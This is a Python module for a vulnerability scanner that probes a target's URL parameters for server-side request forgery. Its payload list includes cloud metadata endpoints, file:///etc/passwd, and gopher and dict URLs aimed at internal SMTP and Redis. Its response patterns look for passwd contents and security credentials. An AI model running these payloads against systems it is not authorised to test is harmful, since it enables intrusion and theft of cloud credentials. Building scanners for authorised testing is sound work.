# modules/vuln_scanner/ssrf_scanner.py

"""
Server-Side Request Forgery Scanner
Author: ATHEX BLACK HAT
Team: Wolf Intelligence PK
Version: 1.0.0

Detects SSRF vulnerabilities through parameter injection
and callback detection.
"""

import re
from typing import Dict, List, Any, Optional
from urllib.parse import urlencode, urlparse, parse_qs

import requests
from requests.exceptions import RequestException


class SSRFScanner:
    """
    Server-Side Request Forgery scanner.
    
    Tests for SSRF vulnerabilities using internal
    addresses and cloud metadata endpoints.
    """
    
    SSRF_PAYLOADS = [
        'http://127.0.0.1',
        'http://localhost',
        'http://0.0.0.0',
        'http://[::1]',
        'http://169.254.169.254/latest/meta-data/',
        'http://metadata.google.internal/',
        'file:///etc/passwd',
        'gopher://127.0.0.1:25/',
        'dict://127.0.0.1:6379/info',
        'http://0177.0.0.1',
        'http://2130706433',
        'http://0x7f.0x0.0x0.0x1',
    ]
    
    SSRF_RESPONSE_PATTERNS = [
        r'root:.:0:0:',
        r'ami-id',
        r'instance-id',
        r'security-credentials',
        r'Blocked by WAF',
        r'connection refused',
        r'Internal Server Error',
        r'REDIS',
        r'redis_version',
    ]
    
    PARAMETER_NAMES = [
        'url', 'uri', 'link', 'src', 'source', 'target',
        'redirect', 'return', 'next', 'goto', 'file',
        'path', 'download', 'fetch', 'proxy', 'image',
        'img', 'picture', 'photo', 'avatar', 'upload',
    ]
    
    def __init__(
        self,
        target: str,
        config: Optional[Dict[str, Any]] = None
    ):
        """
        Initialize the SSRF scanner.
        
        Args:
            target: Target URL
            config: Configuration dictionary
        """
        self.target = target.rstrip('/')
        self.config = config or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
        self.timeout = self.config.get('timeout', 10)
        self.verify_ssl = self.config.get('verify_ssl', False)
        
        self.vulnerabilities: List[Dict[str, Any]] = []
        self.errors: List[str] = []
    
    def extract_parameters(self, url: str) -> Dict[str, str]:
        """Extract URL parameters."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        param_dict = {}
        for key, values in params.items():
            param_dict[key] = values[0] if values else ''
        
        return param_dict
    
    def test_parameter(self, url: str, parameter: str) -> Optional[Dict[str, Any]]:
        """
        Test a single parameter for SSRF.
        
        Args:
            url: Target URL
            parameter: Parameter name
            
        Returns:
            Dictionary with finding or None
        """
        for payload in self.SSRF_PAYLOADS[:8]:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            params = self.extract_parameters(url)
            params[parameter] = payload
            
            test_url = base_url + '?' + urlencode(params)
            
            try:
                response = self.session.get(
                    test_url,
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                    allow_redirects=False
                )
                
                for pattern in self.SSRF_RESPONSE_PATTERNS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        return {
                            'url': test_url,
                            'parameter': parameter,
                            'payload': payload,
                            'pattern_matched': pattern,
                            'status_code': response.status_code,
                        }
                
                if response.status_code in [301, 302]:
                    location = response.headers.get('Location', '')
                    
                    if '127.0.0.1' in location or 'localhost' in location:
                        return {
                            'url': test_url,
                            'parameter': parameter,
                            'payload': payload,
                            'type': 'redirect_to_internal',
                            'location': location,
                        }
                    
            except RequestException:
                continue
        
        return None
    
    def run(self) -> Dict[str, Any]:
        """
        Run SSRF scan.
        
        Returns:
            Dictionary with scan results
        """
        params = self.extract_parameters(self.target)
        
        test_params = [p for p in params if any(pn in p.lower() for pn in self.PARAMETER_NAMES)]
        
        if not test_params:
            test_params = list(params.keys())[:5]
        
        for param_name in test_params:
            result = self.test_parameter(self.target, param_name)
            
            if result:
                self.vulnerabilities.append(result)
        
        findings = []
        
        for vuln in self.vulnerabilities:
            findings.append({
                'type': 'Server-Side Request Forgery (SSRF)',
                'severity': 'high',
                'endpoint': vuln['url'],
                'parameter': vuln['parameter'],
                'description': f"SSRF detected via parameter '{vuln['parameter']}' with payload '{vuln['payload']}'",
                'evidence': vuln,
                'remediation': 'Implement URL whitelist. Validate and sanitize user input. Use network segmentation.',
            })
        
        return {
            'findings': findings,
            'errors': self.errors,
            'vulnerabilities_found': len(findings),
        }